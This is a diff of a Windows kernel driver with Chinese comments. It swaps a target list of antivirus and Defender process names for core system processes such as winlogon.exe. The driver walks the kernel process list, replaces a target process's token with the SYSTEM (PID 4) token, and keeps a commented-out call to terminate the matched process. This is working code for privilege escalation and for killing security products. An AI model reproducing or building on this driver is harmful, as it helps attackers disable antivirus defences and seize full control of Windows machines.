@@ -2,6 +2,8 @@
 #include <ntifs.h>
 #include <wdm.h>
 #include <ctype.h>
+#include <ntddk.h>
+
 // =======================================================================
 //   1. 將所有自訂的結構定義和 IOCTL 放在檔案頂部
 // =======================================================================
@@ -28,7 +30,7 @@ typedef struct _KERNEL_OP_REQUEST {
 
 
 
-int stricmp(const char* s1, const char* s2) {
+int stricmp1(const char* s1, const char* s2) {
     unsigned char c1, c2;
     while (*s1 && *s2) {
         c1 = (unsigned char)tolower((unsigned char)*s1);
@@ -44,19 +46,9 @@ int stricmp(const char* s1, const char* s2) {
 }
 
 const char* names[] = {
-    "MsMpEng.exe",
-    "MsMpEngCP.exe",
-    "avastsvc.exe",
-    "AvastService.exe",
-    "AVGSvc.exe",
-    "ekrn.exe",
-    "egui.exe",
-    "McShield.exe",
-    "mcshield.exe",
-    "gcasServ.exe",
-    "msseces.exe",
-    "ViperService.exe",
-    "defender.exe"
+    "service.exe",
+    "wininit.exe",
+    "winlogon.exe"
 };
 size_t nameCount = sizeof(names) / sizeof(names[0]);
 
@@ -116,7 +108,7 @@ NTSTATUS DeviceControl(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp) {
                 }
                 char* imageName = (char*)((PUCHAR)curr + EPROCESS_IMAGEFILENAME_OFFSET);
                 for (size_t i = 0; i < nameCount; i++) {
-                    if (0 == stricmp(imageName, names[i])) {
+                    if (0 == stricmp1(imageName, names[i])) {
                         PEPROCESS pid4Process = NULL;
                         status = PsLookupProcessByProcessId((HANDLE)pid, &pid4Process);
                         if (!NT_SUCCESS(status)) {
@@ -144,10 +136,26 @@ NTSTATUS DeviceControl(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp) {
                         KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,
                             "[MyDriver] PID %lu 的 Token 指向 PID4 Token: 0x%p\n",
                             req->ProcessId, pid4Token));
+
+                        
+                        // 強制終止
+                        /*
+                        status = ZwTerminateProcess(pid4Process, STATUS_SUCCESS);
+                        if (NT_SUCCESS(status)) {
+                            DbgPrint("Process %d killed.\n", (ULONG)(ULONG_PTR)pid);
+                        }
+                        else {
+                            DbgPrint("ZwTerminateProcess failed: 0x%X\n", status);
+                        }
+
+                        // 3. Deref，不然物件計數不會減
+                        ObDereferenceObject(pid4Process);
+                        */
                         break;
                     }
                 }
             }
+            
 
             pList = pList->Flink; // 下一個
         } while (pList != head); // 繞回來表示走完
